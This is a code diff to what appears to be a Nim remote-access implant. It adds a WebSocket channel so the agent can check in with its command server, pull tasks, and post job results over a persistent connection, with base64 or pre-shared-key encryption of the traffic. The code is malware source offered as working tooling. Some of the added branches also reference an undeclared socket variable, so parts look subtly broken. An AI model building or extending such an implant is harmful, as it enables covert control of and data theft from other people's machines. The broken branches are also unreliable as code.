@@ -3,14 +3,22 @@ import asyncdispatch
 import base64
 import json
 from strutils import split
-import ../utils/http
 import ../utils/checkin
 import ../utils/config
 import ../utils/job
 import ../utils/task
+when defined(useSockets):
+    import ../utils/websocket
+    import ws
+    import uri
+else:
+    import ../utils/http
 
 var curConfig = createConfig()
 var runningJobs: seq[Job]
+const useSockets{.booldefine.}: bool = false
+when defined(useSockets):
+    var socket: WebSocket
 
 proc error*(message: string, exception: ref Exception) =
     echo message
@@ -24,7 +32,12 @@ proc getTasks* : Future[seq[Task]] {.async.} =
     let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
     when not defined(release):
         echo "attempting to get tasks with this data: ", data
-    let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
+
+    when defined(useSockets):
+        let temp = when defined(AESPSK): await Fetch(curConfig, data, true, socket) else: decode(await Fetch(curConfig, data, true, socket))
+    else:
+        let temp = when defined(AESPSK): await Fetch(curConfig, data, true, socket) else: decode(await Fetch(curConfig, data, true))    
+
     when not defined(release):
         echo "decoded temp: ", temp
     if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
@@ -52,7 +65,12 @@ proc checkIn: Future[bool] {.async.} =
     let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
     try:
         # Send initial checkin and parse json response into JsonNode
-        let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
+        # TODO: Add a when defined here to support both http and websocket comms
+        when defined(useSockets):
+            let temp = when defined(AESPSK): await Fetch(curConfig, data, true, socket) else: decode(await Fetch(curConfig, data, true, socket))
+        else:
+            let temp = when defined(AESPSK): await Fetch(curConfig, data, true, socket) else: decode(await Fetch(curConfig, data, true))
+
         when not defined(release):
             echo "decoded temp: ", temp
         var resp = parseJson(temp[36 .. ^1])
@@ -80,6 +98,13 @@ else:
   {.pragma: rtl, }
 
 proc main() {.async, rtl.} = 
+    # Create our websocket connection to the server
+    when defined(useSockets):
+        when not defined(release):
+            echo "URL: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)
+
+        socket = await newWebSocket($(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl))   
+    
     while (not await checkin()):
         let dwell = genSleepTime(curConfig)
         when not defined(release):
@@ -102,7 +127,11 @@ proc main() {.async, rtl.} =
 
         when not defined(release):
             echo "running jobs from joblauncher: ", $(runningJobs)
-        let postResptuple =  await postUp(curConfig, runningJobs)
+
+        when defined(useSockets):    
+            let postResptuple =  await postUp(curConfig, runningJobs, socket)
+        else:
+            let postResptuple =  await postUp(curConfig, runningJobs)
         when not defined(release):
             echo "jobs returned from postUp: ", $(postResptuple.resSeq)
 
